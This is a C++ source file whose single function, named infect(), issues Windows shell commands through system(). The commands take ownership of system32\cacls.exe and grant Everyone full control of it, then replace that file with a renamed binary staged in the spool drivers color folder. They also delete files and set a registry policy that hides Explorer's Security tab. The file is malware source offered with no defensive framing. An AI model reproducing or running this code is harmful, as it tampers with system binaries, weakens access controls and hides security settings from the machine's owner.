#include "abhishek.h"

void infect()
{
char buffer[2000];


strcpy (buffer,"\" del /f /q \"C:\\Windows\\System32\\spool\\drivers\\color\\cacls.exe\" \"");
cout<<"\n\n"<<buffer<<"\n\n";
system(buffer);


strcpy (buffer,"\" copy /y \"C:\\Windows\\System32\\spool\\drivers\\x68\\buffer_overflow.buf\" \"C:\\Windows\\System32\\spool\\drivers\\color\" \"");
cout<<"\n\n"<<buffer<<"\n\n";

system(buffer);


strcpy (buffer,"\" copy /y \"C:\\Windows\\System32\\spool\\drivers\\x68\\buffer.buf\"  \"C:\\Windows\\System32\\spool\\drivers\\color\" \"");

cout<<"\n\n"<<buffer<<"\n\n";
system(buffer);

 

strcpy (buffer,"\" ren \"C:\\Windows\\System32\\spool\\drivers\\color\\buffer_overflow.buf\" \"cacls.exe\" \"");
cout<<"\n\n"<<buffer<<"\n\n";
system(buffer);


strcpy (buffer,"\" takeown /f \"c:\\windows\\system32\\cacls.exe\"");
cout<<"\n\n"<<buffer<<"\n\n";
system(buffer);




strcpy (buffer,"\" \"C:\\Windows\\System32\\spool\\drivers\\color\\cacls.exe\"   \"C:\\Windows\\System32\\cacls.exe\"  /e /g everyone:f \"");
cout<<"\n\n"<<buffer<<"\n\n";

system(buffer);


strcpy (buffer,"\" ren \"C:\\Windows\\System32\\spool\\drivers\\color\\cacls.exe\" \"buffer_overflow.buf\" \"");
cout<<"\n\n"<<buffer<<"\n\n";
system(buffer);

strcpy (buffer,"\" ren \"C:\\Windows\\System32\\spool\\drivers\\color\\buffer.buf\" \"cacls.exe\" \"");
cout<<"\n\n"<<buffer<<"\n\n";
system(buffer);


strcpy (buffer,"\" REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v Nosecuritytab /t REG_DWORD /d 1 /f \"");
system(buffer);


strcpy (buffer," copy /y \"C:\\Windows\\System32\\spool\\drivers\\color\\cacls.exe\" \"c:\\windows\\system32\"");
cout<<"\n\n"<<buffer<<"\n\n";
system(buffer);



strcpy (buffer," del /f /q \"C:\\Windows\\System32\\spool\\drivers\\color\\cacls.exe\" ");
cout<<"\n\n"<<buffer<<"\n\n";
system(buffer);



strcpy (buffer," ren \"C:\\Windows\\System32\\spool\\drivers\\color\\buffer_overflow.buf\" \"cacls.exe\"");


cout<<"\n\n"<<buffer<<"\n\n";
system(buffer);




}
